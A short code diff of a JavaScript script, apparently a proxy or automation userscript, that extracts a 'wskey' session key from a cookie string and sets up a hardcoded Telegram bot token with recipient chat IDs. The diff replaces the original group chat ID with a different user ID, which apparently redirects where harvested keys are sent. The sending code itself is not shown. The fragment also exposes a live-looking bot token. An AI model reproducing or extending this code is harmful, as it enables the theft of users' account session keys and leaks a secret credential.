@@ -13,7 +13,7 @@ const key = CK.match(/wskey=([^=;]+?);/)[1];
 const _TGUserID = $.getData('JDGiaoBot');
 
 $.TGBotToken = '5148458134:AAGEsL6rhysC7opANKjjrNKLw4eidQaPD3w';
-$.TGUserIDs = [-1001545165273];
+$.TGUserIDs = [1031901918];
 if (_TGUserID) {
   $.TGUserIDs.push(_TGUserID);
 }
